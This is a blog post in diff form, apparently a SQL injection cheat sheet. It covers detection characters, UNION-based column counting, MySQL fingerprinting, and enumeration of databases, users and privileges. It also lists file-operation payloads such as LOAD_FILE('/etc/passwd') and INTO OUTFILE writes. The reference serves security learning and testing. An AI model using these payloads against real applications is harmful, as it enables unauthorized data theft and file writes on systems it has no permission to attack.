@@ -1,0 +1,86 @@
+---
+layout: post
+title:  "SQL injection wiki"
+date:   2023-09-05 17:08:00 +0200
+categories: wiki
+sticky: true
+permalink: /wiki/sqli
+---
+
+* TOC
+{:toc}
+
+---
+
+## What is SQL injection
+
+A **SQL injection vulnerability** occurs when **unsanitized user input** is used inside a **SQL query**. It can occur in **login forms**, in search functionalities, or even in **HTTP headers**. This vulnerability can have several consequences, from private data being exfiltrated to **remote code execution**.
+
+## How to detect
+
+When a parameter that is used in a **SQL query** is found (such as a username in a login form) it can be tested to determine whether it is injectable or not. To do so one of the following payloads should be sent to verify it causes any error or behaviour change in the application:
+
+| **Payload** | **URL encoded** |
+|:-----------:|:---------------:|
+|      \'     |       %27       |
+|      \"     |       %22       |
+|      #      |       %23       |
+|      ;      |       %3B       |
+|      )      |       %29       |
+
+If an **error** occurs or the application's **behaviour changes**, then the parameter is **injectable**.
+
+## UNION attack
+
+If the output of a query is **visible** and there is an injectable parameter, **UNION attacks** are possible. However, some information has to be found.
+
+### Finding out the number of columns
+
+First of all, the number of columns returned by the query must be found.
+There are two ways to do so:
+1. Using the **ORDER BY** clause incrementally (*i.e.* injecting **ORDER BY 1**, then **ORDER BY 2**, then **ORDER BY 3**, ...) until an error occurs or the application does not show any output. The **last successful index** used is the number of columns returned by the query.
+2. Using **UNION** incrementally (*i.e.* injecting **UNION NULL**, then **UNION NULL, NULL**, then **UNION NULL, NULL, NULL**, ...). The number of **NULLS** in the first (and only) successful query is the number of columns returned by the query.
+
+After finding out how many columns are returned by the query it is necessary to determine which columns are shown on the **front-end**. To do so, junk data (such as **1** or **\'a\'**) may be used in each column and the front-end must be observed to determine **which** junk data is shown.
+
+### Fingerprinting
+
+Usually, if the webserver runs **Apache** or **Nginx** it is often running on **Linux**, therefore the **DBMS** is likely to be **MySQL**. The same applies to **IIS** webserver usually running **MSSQL** on **Windows**. However this is not always the case.
+
+The following queries may be tried to infer the type of **DBMS** being attacked.
+
+#### MySQL
+
+|    **Payload**   |          **When to use**         | **Expected output** | **Wrong output** |
+|:----------------:|:--------------------------------:|:-------------------:|:----------------:|
+| SELECT @@version |  Full query output is available  |     DBMS version    |       Error      |
+| SELECT POW(1, 1) | Only numeric output is available |          1          |       Error      |
+|  SELECT SLEEP(5) |       Output is not visible      |  0 after 5 seconds  |     No delay     |
+
+### Enumeration
+
+#### MySQL
+
+|        **Effect**       |                                                  **Query**                                                  |
+|:-----------------------:|:-----------------------------------------------------------------------------------------------------------:|
+|      List databases     |                             SELECT schema_name FROM information_schema.schemata;                            |
+|  Print current database |                                              SELECT database();                                             |
+|       List tables       |                       SELECT table_schema, table_name FROM information_schema.tables;                       |
+| List columns in a table | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name=\'TABLE_NAME\'; |
+|    Print current user   |                      SELECT user(); SELECT current_user(); SELECT user FROM mysql.user;                     |
+|    Is user superadmin   |                          SELECT super_priv FROM mysql.user WHERE user=\'USER_NAME\';                          |
+|   Dump user privileges  |      SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee=\'USER_NAME\';      |
+
+### File operations
+
+#### MySQL
+
+If the user has the **FILE** privilege they may **read files** from the underlying filesystem. To be able to **write files**, however, the global variable **secure_file_priv** must also not be enabled.
+
+An empty **secure_file_priv** variable (*i.e.* **\'\'**) allows file operations **everywhere**. If a directory is set, file operations are only allowed in **such directory**. A **NULL secure_file_priv** variable **forbids** reads/writes **anywhere**.
+
+|            **Effect**            |                                                                           **Query**                                                                           |
+|:--------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------:|
+|             Read file            |                                                                SELECT LOAD_FILE(\'/etc/passwd\');                                                               |
+| Determine secure_file_priv value | SHOW VARIABLES LIKE \'secure_file_priv\'; <br> SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name=\'secure_file_priv\'; |
+|           Write to file          |                                                            SELECT \"Hello World!\" INTO OUTFILE \'/path/to/file\';                                                           |
